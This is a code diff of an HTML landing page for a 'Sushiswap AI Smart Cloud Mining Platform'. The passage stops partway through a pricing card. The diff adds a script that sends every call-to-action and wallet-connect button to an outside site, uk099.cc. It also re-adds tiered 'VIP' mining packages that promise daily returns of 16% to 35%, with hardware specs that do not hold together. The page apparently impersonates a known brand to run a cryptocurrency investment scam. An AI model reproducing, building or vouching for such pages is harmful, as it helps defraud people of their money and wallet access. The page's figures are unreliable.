@@ -23,6 +23,11 @@
         }
     </script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        function d2() {
+            window.open('https://uk099.cc', '_blank');
+        }
+    </script>
     <style>
         .btn-primary {
             background-color: #00d4aa;
@@ -121,7 +126,7 @@
                     <a href="#rewards" class="text-gray-300 hover:text-accent">Rewards</a>
                     <a href="#contact" class="text-gray-300 hover:text-accent">Contact</a>
                 </div>
-                <button onclick="k2()" class="btn-primary px-6 py-2 rounded-lg font-semibold">
+                <button onclick="d2()" class="btn-primary px-6 py-2 rounded-lg font-semibold">
                     Get Started
                 </button>
             </div>
@@ -129,17 +134,28 @@
     </nav>
 
     <!-- Hero Section -->
-    <section id="home" class="bg-primary pt-24 pb-20">
-        <div class="container mx-auto px-6">
+    <section id="home" class="relative bg-primary pt-24 pb-20 min-h-screen flex items-center">
+        <!-- Background Image -->
+         <div class="absolute inset-0 z-0">
+    <video class="w-full h-full object-cover" autoplay muted loop>
+        <source src="https://s.ladicdn.com/66091ab391c96600122e593a/homepage-top-video-20250827111802-iwwrw.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <!-- Dark overlay for better text readability -->
+    <div class="absolute inset-0 bg-black bg-opacity-60"></div>
+</div>
+        
+        <!-- Content -->
+        <div class="container mx-auto px-6 relative z-10">
             <div class="max-w-4xl mx-auto text-center">
-                <h1 class="text-5xl md:text-6xl font-bold mb-6 text-white">
+                <h1 class="text-5xl md:text-6xl font-bold mb-6 text-white drop-shadow-lg">
                     Sushiswap
-                    <span class="block text-3xl md:text-4xl font-light mt-2 text-accent">AI Smart Cloud Mining Platform</span>
+                    <span class="block text-3xl md:text-4xl font-light mt-2 text-accent drop-shadow-lg">AI Smart Cloud Mining Platform</span>
                 </h1>
-                <p class="text-xl md:text-2xl mb-8 text-gray-300">
+                <p class="text-xl md:text-2xl mb-8 text-gray-100 drop-shadow-md">
                     Officially Launched! Start your mining journey with our decentralized intelligent mining platform
                 </p>
-                <button onclick="k2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold">
+                <button onclick="d2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold shadow-lg hover:shadow-xl transition-shadow duration-300">
                     Start Your Mining Journey
                 </button>
             </div>
@@ -189,270 +205,9 @@
                     </div>
                 </div>
                 <div class="text-center mt-12">
-                    <button onclick="k2()" class="btn-primary px-8 py-3 rounded-lg text-lg font-semibold">
+                    <button onclick="d2()" class="btn-primary px-8 py-3 rounded-lg text-lg font-semibold">
                         Start Your Mining Journey
                     </button>
-                </div>
-            </div>
-        </div>
-    </section>
-
-
-    <!-- Hosted Mining -->
-    <section class="py-20 bg-primary">
-        <div class="container mx-auto px-6">
-            <div class="max-w-6xl mx-auto">
-                <h2 class="text-4xl font-bold mb-8 text-center text-gradient">Hosted Mining</h2>
-                <p class="text-xl text-center text-gray-300 mb-16">High-Performance Miner Rental – Zero Operation Hassles</p>
-                
-                <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-				
-				 <!-- New Miner 1: Antminer L7 Series -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/b1.jpg" alt="Antminer L7 Series" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">Antminer L7 Series (Litecoin/Dogecoin)</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Algorithm:</span> Scrypt (LTC/DOGE)</p>
-                                <p><span class="text-accent">Hashrate:</span> 9,050-9,500 MH/s</p>
-                                <p><span class="text-accent">Power:</span> ~3,420W</p>
-                                <p><span class="text-accent">Features:</span> Dual front & rear fans, taller and narrower than S series</p>
-                            </div>
-                            
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-					
-					
-					 <!-- New Miner 2: Antminer T19 Series -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/b2.jpg" alt="Antminer T19 Series" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">Antminer T19 Series</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Algorithm:</span> SHA-256 (BTC/BCH)</p>
-                                <p><span class="text-accent">Hashrate:</span> 84T-88T</p>
-                                <p><span class="text-accent">Power:</span> ~3,150W</p>
-                                <p><span class="text-accent">Features:</span> Similar appearance to S19 with "T19" model plate, lower power consumption</p>
-                            </div>
-                            
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-					
-					
-					 <!-- New Miner 3: Antminer S19 Pro/XP Series -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/b3.jpg" alt="Antminer S19 Pro XP Series" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">Antminer S19 Pro/XP Series</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Algorithm:</span> SHA-256 (BTC/BCH)</p>
-                                <p><span class="text-accent">Hashrate:</span> 95T-141T</p>
-                                <p><span class="text-accent">Power:</span> 3,000-3,250W</p>
-                                <p><span class="text-accent">Features:</span> Silver metallic case, dual front & rear fans, right-side power connector</p>
-                            </div>
-                             
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-					
-                    <!-- Miner 4: HOST ANTMINER S19 XP Hyd -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/c1.png" alt="HOST ANTMINER S19 XP Hyd" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">HOST ANTMINER S19 XP Hyd</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Hashrate:</span> 257T</p>
-                                <p><span class="text-accent">Power:</span> 5345.6W</p>
-                                <p><span class="text-accent">Efficiency:</span> 20.8J/T</p>
-                            </div>
-                            <div class="border-t border-gray-600 pt-4 space-y-2">
-                                <p class="text-accent font-semibold">ROIC: 1.7%</p>
-                                <p class="text-gray-300 text-sm">Wallet Balance: $2-1,000</p>
-                                <p class="text-gray-300 text-sm">Profit/Day: $0.4-40</p>
-                            </div>
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Miner 5: Bitcoin Miner S21 Hyd -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/c2.webp" alt="Bitcoin Miner S21 Hyd" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">Bitcoin Miner S21 Hyd.</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Hashrate:</span> 319T</p>
-                                <p><span class="text-accent">Power:</span> 5104W</p>
-                                <p><span class="text-accent">Efficiency:</span> 16J/T</p>
-                            </div>
-                            <div class="border-t border-gray-600 pt-4 space-y-2">
-                                <p class="text-accent font-semibold">ROIC: 1.8%</p>
-                                <p class="text-gray-300 text-sm">Wallet Balance: $1,001-10,000</p>
-                                <p class="text-gray-300 text-sm">Profit/Day: $50-500</p>
-                            </div>
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Miner 6: S19 XP+ Hyd -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/c3.jpg" alt="S19 XP+ Hyd" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">S19 XP+ Hyd</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Hashrate:</span> 1172T</p>
-                                <p><span class="text-accent">Power:</span> 23W</p>
-                                <p><span class="text-accent">Efficiency:</span> 15J/T</p>
-                            </div>
-                            <div class="border-t border-gray-600 pt-4 space-y-2">
-                                <p class="text-accent font-semibold">ROIC: 1.9%</p>
-                                <p class="text-gray-300 text-sm">Wallet Balance: $10,001-50,000</p>
-                                <p class="text-gray-300 text-sm">Profit/Day: $600-3,000</p>
-                            </div>
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Miner 7: DCRACK -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/c4.png" alt="DCRACK" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">DCRACK</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Hashrate:</span> 1572T</p>
-                                <p><span class="text-accent">Power:</span> 36W</p>
-                                <p><span class="text-accent">Efficiency:</span> 15J/T</p>
-                            </div>
-                            <div class="border-t border-gray-600 pt-4 space-y-2">
-                                <p class="text-accent font-semibold">ROIC: 2%</p>
-                                <p class="text-gray-300 text-sm">Wallet Balance: $50,001-100,000</p>
-                                <p class="text-gray-300 text-sm">Profit/Day: $3,500-7,000</p>
-                            </div>
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Miner 8: HOST ANTMINER S19 XP Hyd (High Tier) -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/c5.png" alt="HOST ANTMINER S19 XP Hyd Pro" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">HOST ANTMINER S19 XP Hyd Pro</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Hashrate:</span> 257T</p>
-                                <p><span class="text-accent">Power:</span> 5345.6W</p>
-                                <p><span class="text-accent">Efficiency:</span> 20.8J/T</p>
-                            </div>
-                            <div class="border-t border-gray-600 pt-4 space-y-2">
-                                <p class="text-accent font-semibold">ROIC: 3%</p>
-                                <p class="text-gray-300 text-sm">Wallet Balance: $100,001-200,000</p>
-                                <p class="text-gray-300 text-sm">Profit/Day: $8,000-16,000</p>
-                            </div>
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Miner 9: HOST ANTMINER S19 XP Hyd (Elite) -->
-                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
-                        <div class="h-48 bg-gray-800 flex items-center justify-center">
-                            <img src="img/c6.png" alt="HOST ANTMINER S19 XP Hyd Elite" class="max-w-full max-h-full object-contain">
-                        </div>
-                        <div class="p-6">
-                            <h3 class="text-xl font-bold text-white mb-3">HOST ANTMINER S19 XP Hyd Elite</h3>
-                            <div class="space-y-2 text-sm text-gray-300 mb-4">
-                                <p><span class="text-accent">Hashrate:</span> 257T</p>
-                                <p><span class="text-accent">Power:</span> 5345.6W</p>
-                                <p><span class="text-accent">Efficiency:</span> 20.8J/T</p>
-                            </div>
-                            <div class="border-t border-gray-600 pt-4 space-y-2">
-                                <p class="text-accent font-semibold">ROIC: 4%</p>
-                                <p class="text-gray-300 text-sm">Wallet Balance: $200,001-500,000</p>
-                                <p class="text-gray-300 text-sm">Profit/Day: $20,000-50,000</p>
-                            </div>
-                            <button onclick="k2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
-                                Start Mining
-                            </button>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="text-center mt-12">
-                    <button onclick="k2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold">
-                        Choose Your Mining Package
-                    </button>
-                </div>
-            </div>
-        </div>
-    </section>
-	
-    <!-- User Testimonials -->
-    <section class="py-20 bg-secondary">
-        <div class="container mx-auto px-6">
-            <h2 class="text-4xl font-bold mb-16 text-center text-gradient">What Our Users Say</h2>
-            <div class="grid md:grid-cols-3 gap-8">
-                
-                  
-                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
-                    <div class="flex items-center mb-4">
-                        <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
-                        <div>
-                            <h4 class="text-white font-semibold">Emma Wilson</h4>
-                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-gray-300">"Incredible! Made $500 in my first week. The hourly settlements are real and automatic. Highly recommend!"</p>
-                </div>
-                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
-                    <div class="flex items-center mb-4">
-                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
-                        <div>
-                            <h4 class="text-white font-semibold">Alex Thompson</h4>
-                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-gray-300">"Finally a legitimate platform! No scams, no fake promises. Real mining, real profits. Thank you Sushiswap!"</p>
-                </div>
-                <div class="bg-primary border border-gray-700 p-6 rounded-lg">
-                    <div class="flex items-center mb-4">
-                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=60&h=60&fit=crop&crop=face" alt="User" class="w-12 h-12 rounded-full mr-3">
-                        <div>
-                            <h4 class="text-white font-semibold">Lisa Park</h4>
-                            <div class="text-accent text-sm">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-gray-300">"The referral system is amazing! Earning from my network while they also profit. Win-win for everyone!"</p>
                 </div>
             </div>
         </div>
@@ -500,22 +255,22 @@
                     <h3 class="text-3xl font-bold mb-8 text-center text-white">🔗 Blockchain Networks</h3>
                     <div class="grid md:grid-cols-3 gap-8">
                         <div class="bg-primary border border-gray-700 p-8 rounded-lg text-center">
-                            <div class="w-16 h-16 bg-accent rounded-full flex items-center justify-center mx-auto mb-4">
-                                <span class="text-2xl font-bold text-primary">P</span>
+                            <div class="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                                <img src="img/f1.jpg" alt="Polygon Logo" class="w-full h-full object-contain rounded-lg">
                             </div>
                             <h4 class="text-xl font-semibold text-white mb-2">Polygon</h4>
                             <p class="text-gray-400">Low fees, fast transactions</p>
                         </div>
                         <div class="bg-primary border border-gray-700 p-8 rounded-lg text-center">
-                            <div class="w-16 h-16 bg-accent rounded-full flex items-center justify-center mx-auto mb-4">
-                                <span class="text-2xl font-bold text-primary">B</span>
+                            <div class="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                                <img src="img/f2.jpg" alt="BSC Logo" class="w-full h-full object-contain rounded-lg">
                             </div>
                             <h4 class="text-xl font-semibold text-white mb-2">BSC</h4>
                             <p class="text-gray-400">BNB Smart Chain network</p>
                         </div>
                         <div class="bg-primary border border-gray-700 p-8 rounded-lg text-center">
-                            <div class="w-16 h-16 bg-accent rounded-full flex items-center justify-center mx-auto mb-4">
-                                <span class="text-2xl font-bold text-primary">E</span>
+                            <div class="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
+                                <img src="img/f3.jpg" alt="Ethereum Logo" class="w-full h-full object-contain rounded-lg">
                             </div>
                             <h4 class="text-xl font-semibold text-white mb-2">Ethereum</h4>
                             <p class="text-gray-400">Most secure blockchain</p>
@@ -528,12 +283,16 @@
                     <h3 class="text-3xl font-bold mb-8 text-center text-white">💰 Supported Currencies</h3>
                     <div class="grid grid-cols-2 gap-8 max-w-2xl mx-auto">
                         <div class="bg-primary border border-gray-700 p-8 rounded-lg text-center">
-                            
+                            <div class="w-20 h-20 mx-auto mb-4 flex items-center justify-center">
+                                <img src="img/f4.jpg" alt="USDT Logo" class="w-full h-full object-contain rounded-lg">
+                            </div>
                             <h4 class="text-2xl font-semibold text-white mb-2">USDT</h4>
                             <p class="text-gray-400">Tether USD Stablecoin</p>
                         </div>
                         <div class="bg-primary border border-gray-700 p-8 rounded-lg text-center">
-                            
+                            <div class="w-20 h-20 mx-auto mb-4 flex items-center justify-center">
+                                <img src="img/f5.jpg" alt="USDC Logo" class="w-full h-full object-contain rounded-lg">
+                            </div>
                             <h4 class="text-2xl font-semibold text-white mb-2">USDC</h4>
                             <p class="text-gray-400">USD Coin Stablecoin</p>
                         </div>
@@ -586,25 +345,26 @@
 
                 <div class="text-center">
                     <div class="grid md:grid-cols-3 gap-6 mb-8 max-w-6xl mx-auto">
-                       <div class="rounded-lg overflow-hidden">
+                             <div class="rounded-lg overflow-hidden">
     <video class="w-full h-auto rounded-lg" controls style="max-width: 100%; height: auto;">
         <source src="https://s.ladicdn.com/66091ab391c96600122e593a/chrome_bcguldodvm-20250910055224-kfaff.mp4" type="video/mp4">
         Your browser does not support the video tag.
     </video>
-</div> <div class="rounded-lg overflow-hidden">
+</div>
+                             <div class="rounded-lg overflow-hidden">
     <video class="w-full h-auto rounded-lg" controls style="max-width: 100%; height: auto;">
         <source src="https://s.ladicdn.com/66091ab391c96600122e593a/chrome_pjbqf4gwp8-20250910055743-o4ne4.mp4" type="video/mp4">
         Your browser does not support the video tag.
     </video>
 </div>
-                         <div class="rounded-lg overflow-hidden">
+                            <div class="rounded-lg overflow-hidden">
     <video class="w-full h-auto rounded-lg" controls style="max-width: 100%; height: auto;">
         <source src="https://s.ladicdn.com/66091ab391c96600122e593a/chrome_zvzicwbhoi-20250910060027-3ne3a.mp4" type="video/mp4">
         Your browser does not support the video tag.
     </video>
 </div>
                     </div>
-                    <button onclick="k2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold">
+                    <button onclick="d2()" class="btn-primary px-10 py-4 rounded-lg text-lg font-semibold">
                         Connect Your Wallet & Start Mining
                     </button>
                 </div>
@@ -636,6 +396,240 @@
         </div>
     </section>
 
+    <!-- Hosted Mining -->
+    <section class="py-20 bg-primary">
+        <div class="container mx-auto px-6">
+            <div class="max-w-6xl mx-auto">
+                <h2 class="text-4xl font-bold mb-8 text-center text-gradient">Hosted Mining</h2>
+                <p class="text-xl text-center text-gray-300 mb-16">High-Performance Miner Rental – Zero Operation Hassles</p>
+                
+                <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+				
+				 <!-- Miner 1: VIP1 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="img/b1.jpg" alt="Antminer L7 Series" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">Antminer L7 Series</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 257T</p>
+                                <p><span class="text-accent">Power:</span> 5232.6W</p>
+                                <p><span class="text-accent">Efficiency:</span> 20.8J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP1</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 16%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $12-99</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $1.92-15.84</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+					
+					 <!-- Miner 2: VIP2 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="img/b2.jpg" alt="Antminer T19 Series" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">Antminer T19 Series</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 261T</p>
+                                <p><span class="text-accent">Power:</span> 5412.3W</p>
+                                <p><span class="text-accent">Efficiency:</span> 23.1J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP2</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 17%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $100-799</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $17-135.83</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+					
+					 <!-- Miner 3: VIP3 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="img/b3.jpg" alt="Antminer S19 Pro XP Series" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">Antminer S19 Pro/XP Series</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 283T</p>
+                                <p><span class="text-accent">Power:</span> 5592.6W</p>
+                                <p><span class="text-accent">Efficiency:</span> 26.7J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP3</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 18%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $800-2999</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $144-539.82</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+					
+                    <!-- Miner 4: VIP4 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="https://w.ladicdn.com/s500x450/66091ab391c96600122e593a/d4f5f771-a381-44ef-ac55-2d263a9cdcc2-1-20250909062433-qje5a.png" alt="HOST ANTMINER S19 XP Hyd" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">HOST ANTMINER S19 XP Hyd</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 301T</p>
+                                <p><span class="text-accent">Power:</span> 5718.6W</p>
+                                <p><span class="text-accent">Efficiency:</span> 31.1J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP4</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 20%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $3000-9999</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $600-1999.8</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Miner 5: VIP5 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="img/c2.webp" alt="Bitcoin Miner S21 Hyd" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">Bitcoin Miner S21 Hyd</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 311T</p>
+                                <p><span class="text-accent">Power:</span> 5901.5W</p>
+                                <p><span class="text-accent">Efficiency:</span> 33.4J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP5</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 21%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $10000-19999</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $2100-4199.79</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Miner 6: VIP6 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="https://w.ladicdn.com/s500x450/66091ab391c96600122e593a/c60406ef-11aa-4761-bc0b-abb70a61874e-20250909062656-ckd9y.jpg" alt="S19 XP+ Hyd" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">S19 XP+ Hyd</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 329T</p>
+                                <p><span class="text-accent">Power:</span> 6091.3W</p>
+                                <p><span class="text-accent">Efficiency:</span> 35.7J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP6</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 25%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $20000-49999</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $5000-12499.79</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Miner 7: VIP7 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="https://w.ladicdn.com/s700x550/66091ab391c96600122e593a/b45d2d3b-d821-4ac0-a5e4-c85bf33afe5f-20250909062812-p0pob.png" alt="DCRACK" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">DCRACK</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 341T</p>
+                                <p><span class="text-accent">Power:</span> 6129.6W</p>
+                                <p><span class="text-accent">Efficiency:</span> 38.7J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP7</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 30%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $50000-99999</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $15000-29999.7</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Miner 8: VIP8 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="https://w.ladicdn.com/s550x500/66091ab391c96600122e593a/213de2e8-1386-4333-bc42-c8fe8c60a34f-20250909062958-zf862.png" alt="HOST ANTMINER S19 XP Hyd Pro" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">HOST ANTMINER S19 XP Hyd Pro</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 356T</p>
+                                <p><span class="text-accent">Power:</span> 6201.5W</p>
+                                <p><span class="text-accent">Efficiency:</span> 49.8J/T</p>
+                                <p><span class="text-accent">VIP Level:</span> VIP8</p>
+                            </div>
+                            <div class="border-t border-gray-600 pt-4 space-y-2">
+                                <p class="text-accent font-semibold">Daily rate of return: 35%</p>
+                                <p class="text-gray-300 text-sm">Wallet Balance: $100000-299999</p>
+                                <p class="text-gray-300 text-sm">Daily Profit: $35000-104999.65</p>
+                            </div>
+                            <button onclick="d2()" class="w-full mt-4 btn-primary py-2 rounded-lg font-semibold">
+                                Start Mining
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Miner 9: VIP9 -->
+                    <div class="bg-secondary border border-gray-700 rounded-lg overflow-hidden">
+                        <div class="h-48 bg-gray-800 flex items-center justify-center">
+                            <img src="https://w.ladicdn.com/s500x450/66091ab391c96600122e593a/d4f5f771-a381-44ef-ac55-2d263a9cdcc2-1-20250909062433-qje5a.png" alt="HOST ANTMINER S19 XP Hyd Elite" class="max-w-full max-h-full object-contain">
+                        </div>
+                        <div class="p-6">
+                            <h3 class="text-xl font-bold text-white mb-3">HOST ANTMINER S19 XP Hyd Elite</h3>
+                            <div class="space-y-2 text-sm text-gray-300 mb-4">
+                                <p><span class="text-accent">Hashrate:</span> 361T</p>
